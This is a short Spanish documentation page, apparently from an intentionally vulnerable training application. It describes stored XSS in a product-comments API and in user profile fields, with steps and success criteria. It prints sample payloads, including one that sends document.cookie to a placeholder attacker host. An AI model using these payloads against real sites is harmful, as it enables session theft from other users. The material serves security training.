---
layout: default
title: Cross-Site Scripting (XSS)
nav_order: 4
parent: Vulnerabilidades
---

# Cross-Site Scripting (XSS)

## 4.1 XSS en Comentarios
- **Ubicación**: `/api/v1/products/{id}/comments`
- **Descripción**: Comentarios sin sanitizar permiten XSS
- **Pasos**:
  1. Agregar comentario en producto
  2. Insertar payload XSS
- **Payloads de ejemplo**:
  ```javascript
  <script>alert(document.cookie)</script>
  <img src=x onerror="fetch('http://attacker.com/'+document.cookie)">
  <svg onload="alert(1)">
  ```
- **Criterio de éxito**: Script ejecutado al ver comentario
- **Impacto**: Robo de sesión, defacement

## 4.2 XSS en Perfil
- **Ubicación**: `/api/v1/users/profile`
- **Descripción**: Campos de perfil permiten HTML
- **Pasos**:
  1. Editar perfil
  2. Insertar payload en bio
- **Criterio de éxito**: HTML/JavaScript ejecutado en perfil
- **Impacto**: Ataque a otros usuarios
